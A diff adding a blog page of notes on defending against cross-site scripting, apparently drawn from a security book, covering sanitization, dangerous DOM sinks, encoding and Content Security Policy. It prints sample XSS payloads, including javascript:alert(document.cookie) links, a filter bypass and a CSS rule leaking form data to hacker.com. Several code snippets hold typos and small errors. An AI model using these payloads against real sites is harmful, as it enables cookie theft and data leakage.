@@ -1,0 +1,537 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Defending Against XXS - caketi</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="红凯,
+#Anti-XSS Coding Best Practices**Dont’ allow any user-supplied data to be passwd into the DOM-exce,"> 
+    <meta name="author" content="caketi"> 
+    <link rel="alternative" href="atom.xml" title="caketi" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">caketi</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://example.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">Defending Against XXS</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+                
+                September 17, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/09/17/Defending%20Against%20XSS/" title="Defending Against XXS" class="">Defending Against XXS</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    23k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    21 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <a id="more"></a>
+<p>#Anti-XSS Coding Best Practices<br>**<em>Dont’ allow any user-supplied data to be passwd into the DOM-except as strings**</em></p>
+<blockquote>
+<p>Such a rule is not applicable to all applications, as many applications have features<br>that incorporate users to DOM data transfer. In this case, we can make this rule more<br>specific: “never allow any unsanitized user-supplied data to be passed into the DOM.”</p>
+</blockquote>
+<p>perfrom checks a number of ways on both the client and the server.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>  isString = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> x === <span class="string">&#x27;string&#x27;</span> || x <span class="keyword">instanceof</span> <span class="built_in">String</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>unfortunately, this check will fail when checking numbers–an edge case that can be annoying to deal with beacause numbers are also safe fro injection into the DOM.</p>
+</blockquote>
+<p>***We can categorize strings and numbers into “string-like” objects. evaluate a “string-like” obj using a relatively unknown side effect of JSON.parse():</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isStringLike = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(<span class="built_in">JSON</span>.parse(x)) === x;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;not string-like&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong><em>JSON.parse()</em></strong> — built into js — attempts to convert text to JSON object. Numbers and strings will pass the check, but complex objects such as fucntions will fail as they do not fit a format compatible with JSON</p>
+</blockquote>
+<p>Finally, we must ensure that even when we have a string object or string-like object,<br>the DOM interprets it as string/string-like. This is because string objects, while not<br>DOM themselves, can still be interpreted as DOM or converted into DOM, which we<br>want to avoid.</p>
+<blockquote>
+<p>Generally, we inject user data into the DOM using innerText or innerHTML. When<br>HTML tags are not needed, innerText is much safer because it attempts to sanitize<br>anything that looks like an HTML tag by representing it as a string<br>####Less safe:</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userString = <span class="string">&#x27;&lt;strong&gt;cakeit&lt;/strong&gt;;</span></span><br><span class="line">const div = document.querySelector(&#x27;#userComment&#x27;)</span><br><span class="line">div.innerHTML = userString <span class="comment">// tags interpreted as DOM</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userString = <span class="string">&#x27;&lt;strong&gt;cakeit&lt;/strong&gt;;</span></span><br><span class="line">const div = document.querySelector(&#x27;#userComment&#x27;)</span><br><span class="line">div.innerText = userString; <span class="comment">// tags interpreted as  strings </span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>This is because innerText performs its<br>own sanitization in order to view HTML tags as strings, whereas innerHTML does not<br>perform such sanitization and will interpret HTML tags as HTML tags when loaded<br>into the DOM. The sanitized innerText is not failsafe, as each browser has its own<br>variations on the exact implementation, and with a quick internet search you can find<br>a variety of current and historical ways to bypass the sanitization<br>#Sanitizing User Input<br>Sometimes you will not be able to rely on a useful tool like innerText to aid you in<br>sanitizing user input. This is particularly common when you need to allow certain<br>HTML tags, but not others</p>
+</blockquote>
+<hr>
+<p>+For example, you may want to allow <strong><strong><br>and <i></i> but not <script></script>. In these cases, you want to make sure you<br>extensively sanitize the user-submitted data prior to injecting it into the DOM<br>===============================</p>
+<p>For example, let’s assume your sanitizer blocks single and double quotes as well as<br>script tags. You could still run into this issue:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(document.cookie)&quot;</span>&gt;</span>clck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Using this method with other DOM methods, you can even bypass the filtration on<br>single and double quote:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>would alert “XSS” as the string has been derived rom the <strong><em>String.fromCharCode() API</em></strong></p>
+</blockquote>
+<p>Stay away from the following APIs when possible:</p>
+<ul>
+<li>element.innerHTM<code>L / </code>element.outerHTML</li>
+<li>Blob</li>
+<li>SVG</li>
+<li>document.write / document.writeln</li>
+<li>DOMParser.parseFromString</li>
+<li>document.implementation<br>#DOMParser Sink<br>allow develop to easily generate DOM or script from text<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parser = <span class="keyword">new</span> DOMParser();</span><br><span class="line"><span class="keyword">const</span> html = parser.parseFromString(<span class="string">&#x27;&lt;script&gt;alert(&quot;hi&quot;);&lt;/script&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>This API loads the cotents of the string in <strong><em>parseFromString</em></strong> into DOM nodes reflecting the structure of the input string.This could be used for filling a page with<br>structured DOM from a server, which may be beneficial when you want to turn a<br>complex DOM string into properly organized DOM nodes.</p>
+</blockquote>
+</li>
+</ul>
+<p>However, manually creating each node with document.createElement() and organ‐<br>izing them using document.appendChild(child) offers significantly less risk. You<br>now are controlling the structure and tag names of the DOM while the payload only<br>controls the content.<br>###SVG Sink<br>sinificant risk— store arbitrary data and yet still are capable of code execution:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://www.w3.org/Graphics/SBG/1.1/DTD/sbg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;258&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;250&quot;</span> <span class="attr">r</span>=<span class="string">&quot;50&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;test&#x27;</span>):</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Scalable Vecotr Graphics — SVG– wonderful for displaying images consisitently across a wide number of devices— reliance on the XML spec that allow script execution, they are much riskier </p>
+<blockquote>
+<p>We saw in Part II that we could use the image tag <img> to launch CSRF attacks since<br>the <img> tag supports a href. SVGs can launch any type of JavaScript onload, making<br>them significantly more dangerous.<br>####Blob Sink</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create blob with script reference </span></span><br><span class="line"><span class="keyword">const</span> blog = <span class="keyword">new</span> Blob([script], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/javascript&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">const</span> url = URL.creteObjectURL(blob)</span><br><span class="line"><span class="comment">// inject script into page for execution</span></span><br><span class="line"><span class="keyword">const</span> script  = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">script.src = url</span><br><span class="line"></span><br><span class="line"><span class="comment">// load the script into the page </span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script)</span><br></pre></td></tr></table></figure>
+
+<p>Furthermore, blobs can store data in many formats; base64 as a blob is simply a con‐<br>tainer for arbitrary data. As a result, it is best to leave blobs out of your code if possi‐<br>ble, especially if any of the blob instantiation process involves user data.<br>####Sanitizing Hyperlinks</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;goToLink()&quot;</span>&gt;click me&lt;/button&gt;</span><br><span class="line"><span class="keyword">const</span> userLink = <span class="string">&quot;&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> goToLink = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="built_in">window</span>.location.href = <span class="string">`https://mywebsite.com/<span class="subst">$&#123;userLink&#125;</span>`</span>;</span><br><span class="line"> <span class="comment">// goes to: https://my-website.com/&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userLink = <span class="string">&quot;&lt;script&gt;alert(&#x27;hi&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> goToLink = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">const</span> dummy = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"> dummy.href = userLink;</span><br><span class="line"> <span class="built_in">window</span>.location.href = <span class="string">`https://mywebsite.com/<span class="subst">$&#123;dummy.a&#125;</span>`</span>;</span><br><span class="line"> <span class="comment">// goes to: https://my-website.com/%3Cstrong%3Etest%3C/strong</span></span><br><span class="line">&#125;;</span><br><span class="line">goToLink();</span><br></pre></td></tr></table></figure>
+
+<p>encodeURIComponent(‘<strong>test&lt;/strong’); // %3Cstrong%3Etest%3C%2Fstrong%3E</p>
+<blockquote>
+<p>Note that encodeURIComponent() cannot be used for an entire URL string as it will<br>no longer conform to the HTTP spec because scheme as the origin (scheme + :// +<br>hostname + : + port) cannot be interpreted by browsers when encoded (it becomes<br>a different origin).</p>
+</blockquote>
+<p>####HTML Entity Encoding<br>The “big five” for entity encoding are shown</p>
+<table>
+<thead>
+<tr>
+<th>Charcter</th>
+<th>Entity encoded</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;</td>
+<td>&amp; + amp;</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>&amp; + lt;</td>
+</tr>
+</tbody></table>
+<blockquote>
+<pre><code>      |   &amp; + gt;</code></pre>
+<p>“           |   &amp; + #034;<br>‘           |   &amp; + #039;</p>
+</blockquote>
+<p>Entity encoding will NOT protect any content injected inside of a <script></script> tag, CSS, or a URL. It will only protect against content injected into a <div></div> or <div></div>-like DOM node. This is because it is possible to create a<br>string of HTML entity encoded strings in such an order that part of the string is still<br>valid JavaScript.<br>####CSS</p>
+<p> Any time an image from another origin is<br>loaded into the page, a GET request is issued—be it from HTML, JS, or CSS.<br>In CSS we can use the background:url attribute to load an image from a provided<br>domain. Because this is an HTTP GET, it can also include query params.</p>
+<p>CSS also allows for selective styling based on the condition of a form. This means we<br>can change the background of an element in the DOM based on the state of a form<br>field:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#income</span><span class="selector-attr">[value=<span class="string">&quot;&gt;100k&quot;</span>]</span> &#123;</span><br><span class="line"> <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;https://www.hacker.com/incomes?amount=gte100k&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>As you can see, when the income button is set to &gt;100k, the CSS background changes,<br>initiating a GET request and leaking the form data to another website.</p>
+<p>In conclusion, CSS attacks can be avoided by:<br>[easy]<br>Disallowing user-uploaded CSS<br>[medium]<br>Allowing only specific fields to be modified by the user and generating the<br>custom stylesheet yourself on the server using these fields<br>[hard]<br>Sanitizing any HTTP-initiating CSS attributes (background:url)</p>
+<p>####Content Security Policy for XSS Prevention</p>
+<blockquote>
+<p>CSP protections come in several forms, including what external scripts can be loaded,<br>where they can be loaded, and what DOM APIs are allowed to execute the script.</p>
+</blockquote>
+<p>The “self” in the CSP declaration simply refers to the current URL from which the<br>policy is loaded and the protected document is being served. As such the CSP script<br>source is actually used for defining multiple URLs: safe URLs to load scripts from,<br>and the current URL.</p>
+<p>CSP allows you to specifically whitelist URLs from which dynamic scripts can be<br>loaded. This is known as script-src in your CSP. A simple script-src looks like<br>this: Content-Security-Policy: script-src “self” <a target="_blank" rel="noopener" href="https://api.megabank.com/">https://api.megabank.com</a>.<br>With such a CSP configuration, attempting to load a script from <a target="_blank" rel="noopener" href="https://api2.megabank.com/">https://api2.megabank.com</a> would not be successful, and the browser would throw a CSP violation<br>error. This is very beneficial because it means scripts from unknown sources, like<br><a target="_blank" rel="noopener" href="https://www.hacker.com/">https://www.hacker.com</a>, would not be able to load and execute on your site</p>
+<p>One way to mitigate the risk of scripts you did not write executing inside of your<br>application is to reduce the number of allowed script sources.<br>####Unsafe Eval and Unsafe Inline<br>By default, inline script execution is disabled when CSP is enabled. This can be reenabled by adding unsafe-inline to your script-src definition.<br>Similarly, eval() and similar methods that provide string -&gt; code interpretation<br>are disabled by default when CSP is enabled. This can be disabled with the flag<br>unsafe-eval inside of your script-src definition.</p>
+<p>If you are relying on eval or an eval-like function, it is often wise to try to rewrite<br>that function in a way that does not cause it to be interpreted as a string. For example:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> startCountDownTimer = <span class="function"><span class="keyword">function</span>(<span class="params">minutes, message</span>) </span>&#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="string">`window.alert(<span class="subst">$&#123;message&#125;</span>);`</span>, minutes * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>is written more safely as:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> startCountDownTimer = <span class="function"><span class="keyword">function</span>(<span class="params">minutes, message</span>) </span>&#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> alert(message);</span><br><span class="line">&#125;, minutes * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>While both are valid uses of setTimeout(), one is much more prone to XSS script<br>execution as the complexity of the function grows with the addition of new features.<br>Any function that is interpreted as a string risks potential escape, leading to code exe‐<br>cution. More specific functions with highly specific parameters reduce the risk of<br>unintended script execution.<br>####Implementing a CSP</p>
+<p>CSP is easy to implement as it is simply a string configuration modifier that is read by<br>the browser and translated into security rules</p>
+<p>P, but the most common are:</p>
+<ul>
+<li>Have your server send a content-Security-Policy header with each request.<br>The data in the header should be the security policy itself.</li>
+<li>Embed a <meta> tag in your HTML markup. The meta tag should look like:<meta http-equiv="Content-Security-Policy" content="script-src
+https://www.mega-bank.com;">
+It is wise to enact CSP as a first step in XSS mitigation if you already know what type
+of programming constructs and APIs your application will rely on. This means that if
+you know where you will consume code and how you will consume it, make sure to
+244 | Chapter 22: Defending Against XSS Attacks
+write the correct CSP strings up and utilize them right when you start development.
+CSP can be easily changed at a later date.
+###Summary
+difficulty is protecting your website against XSS usually comes when u have a feature requirement to display user-submitted infor as DOM rather than as text.</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>caketi</p>
+                    <span>Think like an artist, develop like an artisan</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">12 <p>Articles</p></a></li>
+                    <li><a href="/categories">0 <p>Categories</p></a></li>
+                    <li><a href="/tags">0 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            caketi
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.4" target="_blank" rel="noopener">v1.4.4</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+ 
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+ 
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+  
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+ 
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+ 
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+ 
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+  
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+   
+<script src="/js/busuanzi.min.js"></script>
+
+<script>
+  $(document).ready(function () {
+    if ($('span[id^="busuanzi_"]').length) {
+      initialBusuanzi();
+    }
+  });
+</script>
+ 
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
